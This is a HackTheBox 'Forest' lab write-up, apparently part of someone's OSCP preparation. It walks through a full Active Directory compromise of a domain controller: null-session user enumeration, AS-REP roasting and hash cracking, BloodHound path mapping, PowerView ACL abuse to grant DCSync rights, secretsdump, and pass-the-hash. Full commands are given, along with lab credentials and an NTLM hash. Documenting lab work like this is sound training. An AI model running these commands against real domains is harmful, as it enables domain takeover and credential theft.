# HTB - Forest

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078d4?style=flat-square&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![AD](https://img.shields.io/badge/Category-Active%20Directory-blueviolet?style=flat-square)

> A Windows Domain Controller vulnerable to AS-REP Roasting, BloodHound-mapped privilege escalation via nested group abuse, and DCSync through WriteDACL exploitation on the domain object.

---

## Summary

Forest is a Windows Domain Controller running Active Directory. The attack chain starts with an unauthenticated RPC null session that leaks the full domain user list. A service account with Kerberos pre-authentication disabled yields an AS-REP hash which cracks offline in seconds. BloodHound maps a nested group membership path from the compromised service account through Account Operators to Exchange Windows Permissions, a group with WriteDACL on the domain object. This privilege is abused via PowerView to grant DCSync replication rights, allowing a full credential dump. The Administrator NTLM hash is used for a Pass-the-Hash shell to root.

---

## Attack Path

```
Nmap → Domain Controller fingerprinted (Kerberos, LDAP, WinRM)
  ↓
RPC null session (rpcclient) → full domain user enumeration
  ↓
AS-REP Roasting (GetNPUsers) → svc-alfresco hash captured
  ↓
Hashcat (mode 18200) → s3rvice
  ↓
evil-winrm → shell as svc-alfresco [USER FLAG]
  ↓
BloodHound → nested group path to WriteDACL on HTB.LOCAL
  ↓
Account Operators → add to Exchange Windows Permissions
  ↓
PowerView Add-DomainObjectAcl → DCSync rights granted
  ↓
impacket-secretsdump → Administrator NTLM dumped
  ↓
evil-winrm Pass-the-Hash → Administrator [ROOT FLAG]
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV --min-rate 1000 -oA forest 10.129.16.21
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

Ports 88 and 389 confirm a Domain Controller. Port 5985 (WinRM) is open, which becomes the shell vector once credentials are obtained. SMB signing is required, ruling out relay attacks.

### RPC Null Session

```bash
rpcclient -U "" -N 10.129.16.21
rpcclient $> enumdomusers
```

A null session succeeds, exposing the full domain user list without credentials. Key accounts identified: `sebastien`, `lucinda`, `svc-alfresco`, `andy`, `mark`, `santi`.

---

## Exploitation

### AS-REP Roasting

Users with `UF_DONT_REQUIRE_PREAUTH` set do not require Kerberos pre-authentication. An attacker can request their AS-REP ticket unauthenticated and crack the encrypted portion offline.

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.16.21 -no-pass -format hashcat
```

`svc-alfresco` returned a `$krb5asrep$23$` hash. All other users had pre-authentication enforced.

### Hash Cracking

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Cracked in 2 seconds. **Credentials:** `svc-alfresco : s3rvice`

### Initial Shell

```bash
evil-winrm -i 10.129.16.21 -u svc-alfresco -p s3rvice
```

**User flag captured.**

---

## Privilege Escalation

### BloodHound Collection

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -dc forest.htb.local -ns 10.129.16.21 -c all
```

### Attack Path

BloodHound revealed the following nested group membership chain:

```
svc-alfresco
  → Service Accounts
    → Privileged IT Accounts
      → Account Operators
        → [can modify] Exchange Windows Permissions
          → WriteDACL on HTB.LOCAL domain object
```

Account Operators members can modify non-protected group memberships. Exchange Windows Permissions has WriteDACL on the domain object, allowing any member to write new ACEs including granting DCSync replication rights.

### Step 1: Add to Exchange Windows Permissions

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

### Step 2: Grant DCSync Rights via PowerView

```powershell
. .\PowerView.ps1
$pass = convertto-securestring 's3rvice' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```

> This box resets ACLs periodically. Run secretsdump immediately after granting.

### Step 3: DCSync

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.16.21
```

**Administrator NTLM:** `32693b11e6aa90eb43d32c72a07ceea6`

### Step 4: Pass the Hash

```bash
evil-winrm -i 10.129.16.21 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

**Root flag captured.**

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| AS-REP Roasting | svc-alfresco (preauth disabled) | Offline hash crack |
| RPC Null Session | SMB/RPC | Full domain user enumeration |
| Nested Group Abuse | Account Operators membership | Group manipulation |
| WriteDACL on Domain | Exchange Windows Permissions | DCSync rights grant |
| DCSync | Domain object | Full credential dump |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning |
| rpcclient | RPC null session enumeration |
| impacket-GetNPUsers | AS-REP Roasting |
| hashcat | Hash cracking (mode 18200) |
| evil-winrm | Windows remote shell |
| bloodhound-python | AD data collection |
| BloodHound CE | Attack path visualization |
| PowerView | ACL manipulation |
| impacket-secretsdump | DCSync |

---

## Key Takeaways

- Ports 88 + 389 + 5985 together always mean: Domain Controller with a WinRM shell vector waiting for credentials
- RPC null sessions are a powerful unauthenticated enumeration vector. Always try before assuming you need credentials
- Service accounts named `svc-*` are prime AS-REP Roasting targets. Run GetNPUsers against every user you enumerate
- BloodHound is not optional after foothold. Nested group paths are invisible without it
- WriteDACL on the domain object does not require Domain Admin. It just requires group membership in the right place
- DCSync only needs two replication rights, not DA membership
- Pass-the-Hash with evil-winrm `-H` works immediately. Do not waste time cracking if PtH is available
- When an approach fails repeatedly, pivot. Adaptability beats persistence on a broken path

---

*Part of my OSCP preparation journey. Repo: [github.com/mavhezha](https://github.com/mavhezha)*
